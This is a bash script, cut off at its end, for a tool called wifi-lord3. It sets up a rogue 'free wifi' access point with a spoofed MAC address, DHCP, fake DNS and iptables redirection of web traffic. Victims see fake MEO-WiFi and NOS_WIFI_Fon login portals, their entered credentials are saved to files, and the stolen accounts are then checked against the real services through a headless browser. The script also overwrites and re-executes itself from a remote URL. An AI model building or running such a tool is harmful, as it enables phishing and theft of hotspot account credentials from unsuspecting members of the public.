#!/bin/bash
#~~~~~~~~~~~~~~~~~~~~~~~~~~wifi-lord3~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#####################################################################
# autor: sirpedrotavares                                            #
# email: sirpedrotavares@gmail.com                                  #
# git: https://github.com/sirpedrotavares/wifi-lord3                #
# license: GNU GENERAL PUBLIC LICENSE, Version 3, 29 June 2007      #
# Copyright (C) 2016 ~ sirpedrotavares <sirpedrotavares@gmail.com>  #
#####################################################################
#
##########DEBUG-MODE################
#
DEBUG_MODE=0      #[ OFF:0 ; ON: 1 ]
#
####################################

############PALLET COLORS###########
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"
####################################

if [[ $EUID -ne 0 ]]; then
        echo -e ""$red"You don't have admin privilegies, execute the script as root. "$transparent""
        exit 1
fi

#Function executed in case of unexpected termination
trap force_kill_all SIGINT SIGHUP

#DEBUG AND NORMAL MODE
if [ $DEBUG_MODE = 1 ]; then
	#DEBUG_MODE
	export output_device=/dev/stdout
else
	#NORMAL_MODE
	export output_device=/dev/null
fi

##############################################################################################################
#                                              CONFIGURATIONS                                                #
##############################################################################################################
#Global variables
DUMP_PATH="/tmp/wifi-lord3"
WORK_DIR=`pwd`
PERMANENT_WORK_DIR="$WORK_DIR/workdir"
PASSWORDS_DIR="$PERMANENT_WORK_DIR/wifi-lord3-passwords"
revision=1
version=1.1
online_source="https://raw.githubusercontent.com/retinadark/wifi-lord3/master/wifi-lord3.sh"
	
#Window size
TOPLEFT="-geometry 90x13+0+0"
TOPRIGHT="-geometry 83x26-0+0"
BOTTOMLEFT="-geometry 90x24+0-0"
BOTTOMRIGHT="-geometry 75x12-0-0"
TOPRIGHTBIG="-geometry 132x48-0+0"
##############################################################################################################




##############################################################################################################
#                                                 FUNCTIONS                                                  #
##############################################################################################################

#check config file
function configfile {

	HOMEUSER=`cut -d"=" -f2 $WORK_DIR/config 2>/dev/null` 
	
	if [[ -z $HOMEUSER ]] || [[ ! -f "$WORK_DIR/config" ]]; then
		clear
		echo -en "\n"$red"You need to create the "$white"<config>"$transparent" "$red"file in the script location "$white"($WORK_DIR)"$transparent""$red"."$transparent"\n\n"
		echo -en "Example:\n\n"
		echo -en "$> "$blue"echo user=\`whoami\` > config"$transparent""
		echo -en "\n\n ~~ bye ~~\n\n" 
		exit
	fi	
}

#bundle install
function gemfile {

	if [[ ! -f "$WORK_DIR/Gemfile.lock" ]]; then
		clear
		echo -en "\n"$red" Gems are not installed in your system."$transparent""
		echo -en "\n             (Please wait)\n\n"
		sleep 4; clear
		sudo -u $HOMEUSER bundle install
		
		echo -ne "\n\n"$red"You need to restart the script"$transparent"\n\n"
		exit
	fi

}

#get firefox_version
function firefoxversion {
	firefox_version=`firefox -v 2>/dev/null | awk '{print $3}'`
}

#Create permanent working directory
function createPermanentWorkingDir {
	if [ ! -d $PERMANENT_WORK_DIR ]; then
		mkdir -p $PERMANENT_WORK_DIR 2>/dev/null
	fi
}

#Remove working directory
function removeWorkDir {
	if [ -d $DUMP_PATH ]; then
		rm -R $DUMP_PATH 2>/dev/null
	fi
}

# Create working directory
function createWorkingDir {
	if [ ! -d $DUMP_PATH ]; then
		mkdir -p $DUMP_PATH 2>/dev/null
	fi
}

#Check updates
function check_revision_online {
	revision_online="$(timeout -s SIGTERM 20 curl "$online_source" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
	if [ -z "$revision_online" ]; then
		echo "?">$DUMP_PATH/revision
	else     
		echo "$revision_online">$DUMP_PATH/revision
	fi
}

#Progressbar
function ProgressBar {
	let _progress=(${1}*100/${2}*100)/100
	let _done=(${_progress}*4)/10
	let _left=40-$_done

	_fill=$(printf "%${_done}s")
	_empty=$(printf "%${_left}s")

	printf "\r     [${_fill// /#}${_empty// /-}] ${_progress}%%"
}


#Banner
function banner {
	clear; echo -ne "\n"
	echo -e "$blue~~~~~~~~~~~~~~~~~~~~~~~~$green wifi-lord3 $blue~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "                  "$blue"~"$red"by sirpedrotavares""$blue"~""
	echo -e "$green version $red $version"
	echo -e "$green Available on "$blue"https://github.com/sirpedrotavares/wifi-lord3"$transparent""
	echo -e ""$grey" Copyright (C) 2016 ~ "$white"sirpedrotavares "$blue"< "$green"sirpedrotavares@gmail.com"$blue" > "$transparent""
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "                        (Loading)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.03
		ProgressBar ${number} 100
	done
	sleep 2; clear	
}

#Spinner
function spinner {

	local pid=$1
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}

#Writedotsprogress ($1 range; $2 sleep)
function writedotsprogress {
	for number in $(seq 0 $1)
	do
		echo -en "."; sleep $2
	done
}

# Check Dependences
function checkdependences {
	echo ""
	echo -ne ""$transparent"aircrack-ng"; writedotsprogress 24 0.01
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (>= 1.2 RC 4)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent" (>= 1.2 RC 4)"
	fi
	sleep 0.025

	echo -ne "aireplay-ng"; writedotsprogress 24 0.01
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (>= 1.2 RC 4)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent" (>= 1.2 RC 4)"
	fi
	sleep 0.025

	echo -ne "airmon-ng"; writedotsprogress 26 0.01
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (>= 1.2 RC 4)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent" (>= 1.2 RC 4)"
	fi
	sleep 0.025

	echo -ne "airodump-ng"; writedotsprogress 24 0.01
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (>= 1.2 RC 4)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent" (>= 1.2 RC 4)"
	fi
	sleep 0.025

	echo -ne "awk"; writedotsprogress 32 0.01
	if ! hash awk 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "bc"; writedotsprogress 33 0.01
	if ! hash bc 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "bundler"; writedotsprogress 28 0.01
	if ! hash bundler 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "curl"; writedotsprogress 31 0.01
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "dhcpd"; writedotsprogress 30 0.01
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

        #-----browser-----validation-------------
	flag_ok=""$red"Not installed"$transparent""	
	if hash chromium 2>/dev/null; then
		chrome_flag=""$green"chromium"$transparent""
		chrome_installed=""$green"OK"$transparent""
		flag_ok=""$green"OK!"$transparent""
	else
		chrome_flag=""$red"chromium"$transparent""
		chrome_installed=""$red"Not installed"$transparent""
	fi 
	
	if hash firefox 2>/dev/null; then
		firefox_flag=""$green"firefox (45.3.0)"$transparent""
		firefox_installed=""$green"OK"$transparent""
		flag_ok=""$green"OK!"$transparent""
	else
		firefox_flag=""$red"firefox (45.3.0)"$transparent""
		firefox_installed=""$red"Not installed"$transparent""
	fi 
	
	echo -ne ""$blue"* "$transparent"$firefox_flag  or $chrome_flag"; writedotsprogress 4 0.01
        echo -e "$flag_ok (firefox: "$green"$firefox_installed"$transparent" | chromium: "$green"$chrome_installed"$transparent")"
	sleep 0.025	
	#-----browser-----validation-------------

	#echo -ne "$firefox_flag or $chrome_flag"; writedotsprogress 28 0.01
	#if ! hash firefox 2>/dev/null; then
	#	echo -e "\e[1;31mNot installed"$transparent" (firefox 49.0.2 or chromium is needed)"
	#	exit=1
	#else
	#	echo -e "\e[1;32mOK!"$transparent" (firefox 49.0.2 or chromium is needed)"
	#fi
	#sleep 0.025

	echo -ne "hostapd"; writedotsprogress 28 0.01
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "iwconfig"; writedotsprogress 27 0.01
	if ! hash iwconfig 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "lighttpd"; writedotsprogress 27 0.01
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "macchanger"; writedotsprogress 25 0.01
	if ! hash macchanger 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
	    echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "php-cgi"; writedotsprogress 28 0.01
	if ! [ -f /usr/bin/php-cgi ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "pyrit"; writedotsprogress 30 0.01
	if ! hash pyrit 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "python" ; writedotsprogress 29 0.01
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "rfkill" ; writedotsprogress 29 0.01
        if ! hash rfkill 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

	echo -ne "ruby" ; writedotsprogress 31 0.01
        if ! hash ruby 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

	echo -ne "Xvfb"; writedotsprogress 31 0.01
	if ! hash Xvfb 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "xterm"; writedotsprogress 30 0.01
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	if hash bc 2>/dev/null; then
		# check version aircrack-ng. Versions < than 1.2 are slow
		aircrack_v=`aircrack-ng 2>/dev/null | awk 'NR==2{print $2}'` 
		if (( $(echo "$aircrack_v > 1.2" |bc -l) )); then
			echo "aircrak-ng version > 1.2" >$output_device
		elif (( $(echo "$aircrack_v == 1.2" |bc -l) )); then
			echo "aircrak-ng version = 1.2" >$output_device
		else	
			exit=1
			echo ""
			echo -e "Install aircrack-ng version \e[1;31m>= 1.2"$transparent""
			echo -e "Installed version: aircrack-ng "$green"$aircrack_v"$transparent""	
			echo -e "Download it from: \e[1;31mhttps://www.aircrack-ng.org"$transparent""
			echo ""; echo ""
		fi
	fi
	
	echo -en "\n\n"
	echo -en "---------------------------------------------------------\n"
	echo -en ""$blue"*"$transparent"Installation is optional, however some script options may not work correctly.\n"
	echo -en "If you have not installed google chrome (chromium), the firefox version should be 45.3.0.\n"
	
	firefoxversion
		
	if [[ -z $firefox_version ]] || [[ $firefox_version != "45.3.0" ]]; then
		echo -en "\n"$white"Your firefox version is "$red"$firefox_version"$transparent"\n"
	fi
	echo -en "---------------------------------------------------------\n\n"

	if [ "$exit" = "1" ]; then
	exit 1
	fi

	sleep 1
	clear
}


#Header with wifi-lord banner and software update
function header_wifilord3 {
	if [ $DEBUG_MODE = 0 ]; then

		sleep 0.1 && echo -e "$red "
		sleep 0.1 && echo -e "            _  __ _        _               _ ____    "
		sleep 0.1 && echo -e "           (_)/ _(_)      | |             | |___ \   "
		sleep 0.1 && echo -e "  __      ___| |_ _ ______| | ___  _ __ __| | __) |  "
		sleep 0.1 && echo -e "  \ \ /\ / / |  _| |______| |/ _ \| | __/ _  ||__<   "
		sleep 0.1 && echo -e "   \ V  V /| | | | |      | | (_) | | | (_| |___) |  "
		sleep 0.1 && echo -e "    \_/\_/ |_|_| |_|      |_|\___/|_|  \__,_|____/   "
		echo ""
			  
		sleep 1
		echo -e $red"    wifi-lord3 "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" sirpedrotavares"
		echo -n "                  Latest rev."
		check_revision_online &
		spinner "$!"
		revision_online=$(cat $DUMP_PATH/revision)

		echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"

		if [ "$revision_online" != "?" ]; then
			if [ "$revision" != "$revision_online" ]; then
				cp $0 $PERMANENT_WORK_DIR/wifi-lord3_rev-$revision.backup
				curl "$online_source" -s -o $0
				echo
				echo
				echo -e ""$red" Updated successfully! Restarting the script to apply all the changes ..."$transparent""
				sleep 5
				chmod +x $0
				exec $0
			fi
		fi

		sleep 2; echo -ne "\n\n"
	fi
}

#Initial Menu
function initial_menu {
	while true; do
		
		clear; echo -ne "\n"
	
		echo -e " $blue~$white Initial Menu $blue~$transparent\n"
		echo -e "     $white["$blue"1$white] $yellow Rogue access point (free wifi)"
		#echo -e "     $white["$blue"2$white] $yellow Crack WPA without brute-force"
		#echo -e "     $white["$blue"3$white] $yellow Crack WPA via brute-force"
		echo -e "     $white["$blue"0$white] $yellow Exit"
		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		
		read yn
		case $yn in
			1 ) MenuRogueAccessPoint; break;;
			#2 );;
			#3 );;
			0 ) exit_menu; break;;
			* ) echo -e -n "\n\n      "$red"(Unknown option. Please choose again)"$transparent""; sleep 2; clear ;;	
		esac
	      
	done
}

#show account files
function show_account_files {

		clear
		echo -e " $blue~$white List of Account Files $blue~$transparent"
		ls -l $PASSWORDS_DIR 2>/dev/null | awk '{print $5 " " $6 " " $8 "          "$9}'
		echo -ne "\n\n"
		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		echo -en "Type the "$white"name"$transparent" of the target file here or "$white"0"$transparent" to back: "
		read target_file
	
}

#validate headless browser
function headless_browser {
	clear
	firefoxversion	

	if [[ $firefox_version == "45.3.0" ]]; then
		
		DRIVER="firefox"
		
	        gem_version=`sudo -u $HOMEUSER gem list | grep selenium-webdriver | awk '{print $2}'`
		
		
		if [[ -z $gem_version ]] || [[ $gem_version != "(2.51.0)" ]]; then
			sudo -u $HOMEUSER gem uninstall selenium-webdriver
			sleep 1
			sudo -u $HOMEUSER gem install selenium-webdriver -v 2.51.0
		fi

	else
		DRIVER="chrome"
		gem_version=`sudo -u $HOMEUSER gem list | grep selenium-webdriver | awk '{print $2}'`
		
		if [[ $gem_version == "(2.51.0)" ]]; then
			sudo -u $HOMEUSER gem uninstall selenium-webdriver
			sleep 1
			sudo -u $HOMEUSER gem install selenium-webdriver
		fi
	fi
		
} 

#validate meo accounts
function validate_meo_accounts {
	headless_browser
	show_account_files
	xterm -hold -title "MEO WiFi Accounts Validator" $TOPRIGHT -bg "#000000" -fg "#66ff33" -e "sudo -u $HOMEUSER ruby $WORK_DIR/lib/validate_MEO/script.rb $PASSWORDS_DIR/$target_file $DRIVER 2>&1 | tee -a $PERMANENT_WORK_DIR/meo_accounts_validator_log.txt" &
	validated_collected_accounts_menu
}

#validate nos accocunts
function validate_nos_accounts {
 	headless_browser
	show_account_files
	xterm -hold -title "NOS WiFi Accounts Validator" $TOPRIGHT -bg "#000000" -fg "#66ff33" -e "sudo -u $HOMEUSER ruby $WORK_DIR/lib/validate_NOS/script.rb $PASSWORDS_DIR/$target_file $DRIVER 2>&1 | tee -a $PERMANENT_WORK_DIR/nos_accounts_validator_log.txt" &
	validated_collected_accounts_menu
}


#validated collected accounts menu
function validated_collected_accounts_menu {
	
	if ping -c 1 google.com >> /dev/null 2>&1; then
		clear	
		while true; do
		
			clear; echo -ne "\n"
	
			echo -e " $blue~$white Validation Accounts Menu $blue~$transparent\n"
			echo -e "     $white["$blue"1$white] $yellow MEO WiFi Accounts"
			echo -e "     $white["$blue"2$white] $yellow NOS WiFi Accounts"
			echo -e "     $white["$blue"0$white] $yellow Back"
			echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		
			read yn
			case $yn in
				1 ) validate_meo_accounts; break;;
				2 ) validate_nos_accounts; break;;
				0 ) MenuRogueAccessPoint; break;;
				* ) echo -e -n "\n\n      "$red"(Unknown option. Please choose again)"$transparent""; sleep 2; clear ;;	
			esac
		      
		done
	else
		echo -e -n "\n\n      "$red"(No Internet connection)"$transparent""; sleep 4
		echo ""
		clear
		MenuRogueAccessPoint

	fi

}

#Menu RogueAccessPoint
function MenuRogueAccessPoint {
	clear	
	while true; do
		
		clear; echo -ne "\n"
	
		echo -e " $blue~$white Rogue Access Point Menu $blue~$transparent\n"
		echo -e "     $white["$blue"1$white] $yellow Create a rogue access point (free wifi)"
		echo -e "     $white["$blue"2$white] $yellow Validate collected accounts "$red"(Internet connection required)"$transparent""
		echo -e "     $white["$blue"0$white] $yellow Back"
		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		
		read yn
		case $yn in
			1 ) flux_rogue_ap; break;;
			2 ) validated_collected_accounts_menu; break;;
			0 ) initial_menu; break;;
			* ) echo -e -n "\n\n      "$red"(Unknown option. Please choose again)"$transparent""; sleep 2; clear ;;	
		esac
	      
	done
}

#List wireless interfaces
function list_ifaces_wireless {

	#unblock interfaces
	rfkill unblock all

	# Kill all interfaces in mode monitor
	INTERFACES_MODE_MONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

	for obj in ${INTERFACES_MODE_MONITOR[@]}; do
		airmon-ng stop $obj >$output_device
	done

	# Create a list with all interfaces
	readarray -t wirelessifaces < <(airmon-ng | awk '{print $2}')
	INTERFACES_NUMBER=`airmon-ng| grep -c ""`

	# Show target wireless interfaces
	if [ "$INTERFACES_NUMBER" -gt "4" ]; then

		clear; echo -ne "\n"
		echo -e " $blue~$white Available Wireless Interfaces $blue~$transparent\n"

		i=0
		for line in "${wirelessifaces[@]}"; do
			if [[ $line = *"Interfac"* ]] || [[ -z "$line" ]]; then
				continue
			fi
			i=$(($i+1))
			wirelessifaceslist[$i]=$line
			echo -e "     $white["$blue"$i$white] $yellow $line"
		done

		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		read line

		if [[ -n ${line//[0-9]/} ]]; then
    			clear
			list_ifaces_wireless
		fi

		interface=${wirelessifaceslist[$line]}
		check_valid_interface=0
		for line in "${wirelessifaceslist[@]}"; do
			if [[ $line == "$interface" ]]; then
				check_valid_interface=1; break
			fi
		done

		if [ $check_valid_interface -eq 0 ]; then
			clear
			list_ifaces_wireless
		fi

			readarray -t allservices < <(airmon-ng check $interface | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(airmon-ng | grep "$interface" | awk '{print($(NF-2))}')

		if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
			rmmod -f "$WIFIDRIVER" &>$output_device 2>&1
		fi

		for service in "${allservices[@]}"; do
			killall "$service" &>$output_device
			sleep 0.5
		done
		

		if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
			modprobe "$WIFIDRIVER" &>$output_device 2>&1
			sleep 0.5
		fi
	else
		echo ""$red"     No wireless interfaces found"$transparent""
		sleep 5
		exit 1
		
	fi
}

#Web interfaces
function menu_webinterfaces {

	clear	
	while true; do
		
		clear; echo -ne "\n"
	
		echo -e " $blue~$white Web Interfaces $blue~$transparent\n"
		echo -e "     $white["$blue"1$white] $yellow MEO-WiFi"
		echo -e "     $white["$blue"2$white] $yellow NOS_WIFI_Fon"    

		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		
		read yn
		case $yn in
			1 ) MEO; break;;
			2 ) NOS_WIFI_Fon; break;;
			* ) echo -e -n "\n\n      "$red"(Unknown option. Please choose again)"$transparent""; sleep 2; clear ;;	
		esac
	      
	done	
		
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "                        (Building)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.03
		ProgressBar ${number} 100
	done
}

#macchanger
function changeMacAddress {
	ifconfig $interface down &>$output_device
	sleep 2
	MAC_ADDRESS=`macchanger -r $interface | awk 'NR==3{print $3}'` &>$output_device
	sleep 2
	ifconfig $interface up &>$output_device
	sleep 2
}

#Initialize interface in mode mon
function modemon {
	ifconfig $interface down &>$output_device
	sleep 2
	ifconfig $interface mtu 9000 up	&>$output_device; echo -ne "Not increased 9000 MTU on Iface " &> $output_device
	sleep 2	
	airmon-ng start $interface &>$output_device
	sleep 2
	airmon-ng check kill &> $output_device
	sleep 1
}

#Configure interfaces
function configure_wireless_card {
	#airbase-ng
	if [[ $apmode -eq 2 ]]; then
		sleep 5
		ifconfig at0 up &> $output_device
		sleep 1
		ifconfig at0 192.168.1.1 netmask 255.255.255.0 &> $output_device
		sleep 1
	#hostapd	
	else
		sleep 5
		ifconfig $interface up &> $output_device
		sleep 1
		ifconfig $interface 192.168.1.1 netmask 255.255.255.0 &> $output_device
		sleep 1
	fi
}

#InitializeAP
function initializeAP {

	while [ 1 ]; do
		clear; echo -ne "\n"
		echo -e " $blue~$white Name of the target rogue access point $blue~$transparent\n"
		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "	
		read nameap
		if [[ ! -z $nameap ]]; then
			break
		fi
	done

	#verify all channels
	chanels=`iwlist $interface frequency 2>/dev/null | awk 'NR==1{print $2}'`
	while [ 1 ]
	do	
		clear; echo -ne "\n"
		echo -e " $blue~$white Channel number [1-$chanels] $blue~$transparent\n"
		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "	
		
		read chanellap
		if [[ $chanellap -ge 1 ]] && [[ $chanellap -le $chanels ]]; then
			break
		fi
	done
	
        if [[ $interface != *"mon"* ]];then
		mon="mon"
        fi

	while [ 1 ]; do
		clear; echo -ne "\n"
		echo -e " $blue~$white Access Point Emulator $blue~$transparent\n"
		echo -e "     $white["$blue"1$white] $yellow hostapd "$red" (recommended)"
		echo -e "     $white["$blue"2$white] $yellow airbase-ng"
		
		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		read apmode
		
		#define all menu options
		if [[ $apmode -eq 1 ]] || [[ $apmode -eq 2 ]]; then
			break	
		fi	 
	done
	
        clear; echo -e -n "\n"
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "           (Building rogue AP dependencies)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.03
		ProgressBar ${number} 100
	done

	changeMacAddress

	sleep 0.25; echo -e -n "\n\n\n"; echo -en "              (Changing MAC Address)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.03
		ProgressBar ${number} 100
	done


	#airbase-ng
	if [[ $apmode -eq 2 ]]; then

		modemon
	
		sleep 0.25; echo -e -n "\n\n\n"; echo -en "           (Changing "$red"$interface"$transparent" to monitor mode)\n"	
	
		for number in $(seq 0 100)
		do
			sleep 0.03
			ProgressBar ${number} 100
		done

		killall airbase-ng &> $output_device
		xterm -hold -title "AP: $nameap" $TOPLEFT -bg "#FFFFFF" -fg "#000000" -e airbase-ng -e $nameap -c $chanellap -a $MAC_ADDRESS -P "$interface$mon" &

		sleep 0.25; echo -e -n "\n\n\n"; echo -en "               (Configuring interface at0)\n"	
	
		for number in $(seq 0 100)
		do
			sleep 0.03
			ProgressBar ${number} 100
		done

		configure_wireless_card

	#hostapd
	else
		
echo "interface=$interface
driver=nl80211
ssid=$nameap
channel=$chanellap" > $DUMP_PATH/hostapd.conf
		
		airmon-ng check kill &> $output_device
		killall dhcpd hostapd dhclient &> $output_device
		xterm -hold -title "AP: $nameap" $TOPLEFT -bg "#FFFFFF" -fg "#000000" -e hostapd $DUMP_PATH/hostapd.conf &

		sleep 0.25; echo -e -n "\n\n\n"; echo -en "          (Configuring interface $interface)\n"	
	
		for number in $(seq 0 100)
		do
			sleep 0.03
			ProgressBar ${number} 100
		done

		configure_wireless_card

	fi
	
}

#iptables and rules
function iptablesandrules {
	
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "               (Configuring iptables)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.001
		ProgressBar ${number} 100
	done
	
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		sysctl -w net.ipv4.ip_forward=1
	fi
        sleep 1
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
	iptables -t nat -A POSTROUTING -j MASQUERADE
	sleep 1
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "               (Configuring routing table)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.009
		ProgressBar ${number} 100
	done
}

#webserver
function webserverstart {
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "               (Configuring lighttpd web-server)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.02
		ProgressBar ${number} 100
	done

	lighttpd -f "$DUMP_PATH/lighttpd.conf" &> $output_device
}

#dhcpd
function dhcpstart {
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "               (Configuring dhcpd server)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.001
		ProgressBar ${number} 100
	done

	if [[ $apmode -eq 2 ]]; then
		xterm -hold -title "DHCP" $TOPRIGHT -bg "#000000" -fg "#66ff33" -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" at0 2>&1 | tee -a $DUMP_PATH/hosts.txt" &

	else
		xterm -hold -title "DHCP" $TOPRIGHT -bg "#000000" -fg "#66ff33" -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interface 2>&1 | tee -a $DUMP_PATH/hosts.txt" &
	fi

}

#fakedns
function fakedns {
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "               (Configuring fake DNS)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.03
		ProgressBar ${number} 100
	done

	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
}

#List of all passwords and clients
function show_clients {
	xterm -hold -title "Clients" $TOPRIGHTBIG -bg "#000000" -fg "#ffffff" -e "$DUMP_PATH/check_clients.sh" & 	
}


# Flux Rogue Access Point
function flux_rogue_ap {
	createWorkingDir
	list_ifaces_wireless
	rootfiles
	menu_webinterfaces
	initializeAP
	iptablesandrules
	webserverstart	
	dhcpstart
	fakedns
	show_clients
	finalMenu
}

#Exit menu
function exit_menu {
	clear;
	echo ""
	echo ""
	echo -en "Thanks ~ by "$red"sirpedrotavares"
	echo ""
	echo ""
	exit 1
}

#FinalMenu
function finalMenu {
	clear	
	while true; do
		
		clear; echo -ne "\n"
	
		echo -e " $blue~$white Final Menu $blue~$transparent\n"
		echo -e "     $white["$blue"1$white] $yellow Stop and Back to Start Menu"
		echo -e "     $white["$blue"2$white] $yellow Stop and Exit"

		echo -ne "\n"$yellow"["$blue"wifi-lord3"$yellow"] "$red"$:>"$transparent" "
		
		read yn
		case $yn in
			1 ) kill_all; initial_menu; break;;
			2 ) kill_all; exit_menu; break;;
			* ) echo -e -n "\n\n      "$red"(Unknown option. Please choose again)"$transparent""; sleep 2; clear ;;	
		esac
	      
	done

}

# Kill all and restore
function kill_all {
	clear; echo "";
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "             (kill and restore processes)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.04
		ProgressBar ${number} 100
	done

	#save passwords
	if [ ! -d $PASSWORDS_DIR ]; then
		mkdir -p $PASSWORDS_DIR 2>/dev/null
	fi
	timestamp=`date +"%Y-%m-%d_%H-%M-%S"`
	cp $DUMP_PATH/page/auth.txt $PASSWORDS_DIR/wifi-lord3_$nameap-$timestamp.txt &>$output_device	

	rm -rf $DUMP_PATH/* &>$output_device
	rm -R $DUMP_PATH 2>/dev/null
